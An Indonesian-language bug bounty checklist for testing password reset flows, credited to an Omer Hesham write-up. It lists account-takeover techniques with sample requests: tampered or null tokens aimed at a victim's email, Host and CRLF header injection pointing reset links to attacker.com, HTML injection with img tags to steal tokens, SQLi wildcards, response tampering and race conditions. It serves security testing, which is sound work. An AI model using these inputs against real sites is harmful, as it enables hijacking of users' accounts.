# Password Reset Vulnerability Checklist

Berdasarkan artikel oleh **Omer Hesham** dan berbagai sumber *bug bounty*.

> Referensi utama: [HubSpot Full Account Takeover](https://medium.com/bugbountywriteup/hubspot-full-account-takeover-in-bug-bounty-4e2047914ab5)

## Daftar Teknik Pengujian

### Token Manipulation

- **Gunakan token sendiri pada email korban**  
  `POST /reset` dengan parameter `email=victim@gmail.com&token=$YOUR_TOKEN`

- **Hapus token**  
  `http://example.com/reset?email=victim@gmail.com&token=`

- **Ubah token menjadi `000000000`**  
  `http://example.com/reset?email=victim@gmail.com&token=000000000`

- **Gunakan nilai null/nil**  
  `http://example.com/reset?email=victim@gmail.com&token=Null` atau `&token=nil`

- **Kirim array token lama**  
  `http://example.com/reset?email=victim@gmail.com&token=[oldtoken1,oldtoken2]`

- **Kirim token sangat panjang** (massive token) untuk menyebabkan *error* atau *overflow*  
  `http://example.com/reset?email=victim@gmail.com&token=AAAA...` (1 juta karakter)

- **Ubah satu karakter di awal/akhir token** – lihat apakah token dievaluasi secara longgar

- **Cek kebocoran token di *response body*** – kadang token reset dikembalikan dalam respons

### Header Injection & Manipulation

- **Host Header Injection**  
  `POST /reset` dengan `Host: attacker.com` – lihat apakah *password reset link* dikirim ke domain penyerang

- **HTML injection di Host Header**  
  `POST /reset` dengan `Host: attacker">.com` – coba injeksi HTML/XSS

- **CRLF injection di URL**  
  `/resetPassword?0a%0dHost: attacker.tld` – uji pada parameter `Host`, `X-Forwarded-Host`, `True-Client-IP`, dll.

- **Kebocoran token di Referer header**  
  Periksa apakah *Referer* mengirimkan token, misal:  
  `Referer: https://website.com/reset?token=1234`

### Email-Based Exploits

- **HTML injection di email**  
  Coba injeksi HTML pada parameter, cookie, atau *input* lain yang masuk ke email. Gunakan tag `<img>` untuk mencuri token.

- **Gunakan email perusahaan**  
  Saat mengundang pengguna ke akun/organisasi, tambahkan *field* `"password": "example123"` atau `"pass": "example123"` dalam request.  
  > Cari email perusahaan di *public GitHub repository members* atau gunakan [Hunter.io](https://hunter.io). Jika berhasil, kita bisa login ke akun tersebut (termasuk SSO, *support portal*, dll).

### Spoofing & Bypass

- **Gunakan karakter Unicode (Jutzu)** untuk *spoof* alamat email (*homograph attack*)

- **Coba daftar dengan email yang sama tetapi TLD berbeda** (misal: `.eu`, `.net`, `.co`)

- **SQL injection bypass**  
  Uji *wildcard* seperti `%`, `*`, atau teknik SQLi pada parameter token atau email

- **Ubah request method & content type**  
  - Ganti method: GET → PUT → POST → PATCH  
  - Ubah *content type*: `application/json` ↔ `application/xml`

- **Response manipulation**  
  Tangkap respons *error* (misal 403/400) dan ganti dengan respons *success* (200/302) – lihat apakah server memprosesnya

### Lain-lain

- **Cross-domain token usage**  
  Jika program memiliki banyak domain dengan mekanisme reset yang sama, coba gunakan token yang dihasilkan untuk domain A di domain B

- **Race condition**  
  Kirim banyak *request reset password* secara bersamaan – lihat apakah token dapat digunakan lebih dari sekali atau ada kondisi balapan

- **Parameter token kosong atau null di tempat lain**  
  Coba hapus parameter token sepenuhnya, atau kirim nilai kosong di parameter lain seperti `reset_token=`
